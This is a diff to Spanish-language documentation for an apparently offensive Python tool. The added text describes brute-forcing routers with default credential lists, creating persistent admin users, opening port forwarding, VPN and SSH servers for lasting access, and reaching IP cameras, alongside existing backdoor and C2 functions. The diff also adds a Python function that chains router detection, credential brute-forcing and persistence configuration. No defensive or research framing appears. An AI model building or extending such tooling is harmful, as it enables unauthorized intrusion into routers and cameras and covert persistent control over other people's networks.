@@ -75,7 +75,9 @@ Cada fase tiene la misma estructura:
   - `_create_backdoors()`: Instala backdoors
   - `_establish_remote_connections()`: Establece conexiones remotas
   - `_setup_c2_pointers()`: Configura apuntadores C2
-  - `_access_detected_cameras()`: Accede a cámaras IP detectadas
+  - `_access_detected_cameras()`: Detecta y accede a cámaras IP
+  - `_access_router_and_configure_persistence()`: Accede al router y configura persistencia
+  - `_configure_network_persistence()`: Configura servicios de red persistentes
 
 ### Fase 5: Verificación (Líneas 702-800)
 - **Función principal**: `phase_5_verification()`
@@ -154,8 +156,59 @@ self.config = {
     'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
     'default_passwords': ['admin', 'password', '123456', 'root', 'guest', ''],
     'camera_users': ['admin', 'administrator', 'root', 'guest', 'user', 'camera', 'ipcam', 'webcam', 'viewer', 'operator'],
-    'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123']
+    'camera_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'camera', 'ipcam', 'webcam', 'viewer', 'operator', '1234', '12345', '123456789', 'admin123', 'password123'],
+    'router_ports': [80, 443, 8080, 8443, 23, 22, 21, 161, 162],
+    'router_users': ['admin', 'administrator', 'root', 'guest', 'user', 'admin', 'root', 'user', 'support', 'technician'],
+    'router_passwords': ['admin', 'password', '123456', 'root', 'guest', '', 'admin', 'password', '1234', '12345', '123456', 'admin123', 'password123', 'support', 'technician']
 }
+```
+
+## Funciones de Router y Persistencia de Red
+
+### Acceso al Router
+- `_access_router_and_configure_persistence()`: Función principal para acceso al router
+- `_detect_router_type()`: Detecta el tipo/marca del router
+- `_brute_force_router_credentials()`: Fuerza bruta específica para routers
+- `_configure_router_persistence()`: Configura persistencia en el router
+- `_create_router_admin_user()`: Crea usuario administrativo persistente
+- `_configure_port_forwarding()`: Configura port forwarding
+- `_configure_vpn_server()`: Configura servidor VPN en el router
+- `_configure_remote_access()`: Habilita acceso remoto
+- `_backup_router_config()`: Hace backup de la configuración
+
+### Persistencia de Red
+- `_configure_network_persistence()`: Función principal de persistencia de red
+- `_setup_persistent_ssh_server()`: Configura servidor SSH persistente
+- `_setup_persistent_vpn_server()`: Configura servidor VPN propio
+- `_setup_persistent_web_server()`: Configura panel web de administración
+
+```python
+def _access_router_and_configure_persistence(self) -> List[Dict[str, Any]]:
+    """Acceder al router y configurar persistencia de red"""
+    router_access = []
+    
+    # Obtener gateway detectado
+    gateway = self.network_config.get('gateway')
+    
+    # Detectar tipo de router
+    router_type = self._detect_router_type(gateway)
+    
+    # Intentar credenciales por defecto
+    router_credentials = self._brute_force_router_credentials(gateway)
+    
+    if router_credentials:
+        # Configurar acceso persistente al router
+        router_config = self._configure_router_persistence(gateway, router_credentials, router_type)
+        
+        router_access.append({
+            'gateway': gateway,
+            'router_type': router_type,
+            'credentials': router_credentials,
+            'configuration': router_config,
+            'timestamp': time.time()
+        })
+    
+    return router_access
 ```
 
 ## Funciones de Cámaras IP
@@ -495,6 +548,10 @@ def main():
 - `openssh-client`: Conexiones SSH
 - `smbclient`: Conexiones SMB
 - `ping`: Verificación de hosts
+- `openssl`: Generación de certificados
+- `ssh-keygen`: Generación de claves SSH
+- `openvpn`: Servidor VPN
+- `nginx`: Servidor web (opcional)
 
 ### Python
 - Versión: 3.6+
